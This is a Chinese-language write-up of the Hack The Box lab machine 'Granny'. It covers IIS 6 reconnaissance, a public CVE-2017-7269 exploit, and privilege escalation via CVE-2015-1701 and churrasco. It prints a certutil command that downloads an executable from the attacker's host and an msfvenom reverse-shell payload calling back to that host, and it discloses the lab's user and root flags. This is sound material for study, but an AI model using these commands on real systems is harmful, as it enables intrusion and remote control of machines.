---
title: Granny (Hack The Box Writeup)
date: 2021-09-15T13:54:00+08:00
draft: false
url: "/2021/09/15/granny-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/14
- IP : 10.129.2.63

## Recon

- 觀察首頁![](/uploads/2022/02/46f13-sbQcIWf.png)
- IIS 6nmap 掃 port- `nmap -A -p80 10.129.2.63`
- ![](/uploads/2022/02/db6f1-yNZQlXN.png)掃目錄- ![](/uploads/2022/02/6d3ac-CjmfC20.png)發現一些奇怪的 dll- ![](/uploads/2022/02/19e20-yZGtChe.png)
- http://10.129.2.63/_vti_inf.html
- `FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"`
- `FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"`
- `TPScriptUrl="_vti_bin/owssvr.dll"`

## Exploit

- https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269![](/uploads/2022/02/d60bd-EOeoMgt.png)nc 收 shell- ![](/uploads/2022/02/7df3f-7HqJyNX.png)確認使用者- ![](/uploads/2022/02/c574d-X8v5anL.png)systeminfo- ![](/uploads/2022/02/203c0-9WVQAXz.png)送 `windows-exploit-suggester.py`- ![](/uploads/2022/02/375b3-xLOYh1g.png)測 CVE-2015-1701- https://github.com/hfiref0x/CVE-2015-1701
- `certutil -urlcache -f http://10.10.16.35/Taihou32.exe Taihou32.exe`
- ![](/uploads/2022/02/d9b6e-60L0w3I.png)
- ![](/uploads/2022/02/ede09-KXnF3bF.png)
- `impacket-smbserver meow .`
- `copy \\10.10.16.35\meow\Taihou32.exe Taihou32.exe`
- shell 卡住不能用 QQQ

## 提權

- 準備 shell`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7878 -f dll > s.dll`
- `rundll32 s.dll``churrasco`- ![](/uploads/2022/02/e496c-3TwWxzC.png)
- churrasco.exe -d "shellx86.exe"nc 收 shell- ![](/uploads/2022/02/9cb18-xFp3xBs.png)User flag- ![](/uploads/2022/02/cc1c9-fdfbgPb.png)
- `700c5dc163014e22b3e408f8703f67d1`Root Flag- ![](/uploads/2022/02/9e134-5QkzuUu.png)
- `aa4beed1c0584445ab463a6747bd06e9`

## 學到ㄌ

- smb 傳檔案
- 盡量 webshell QQ
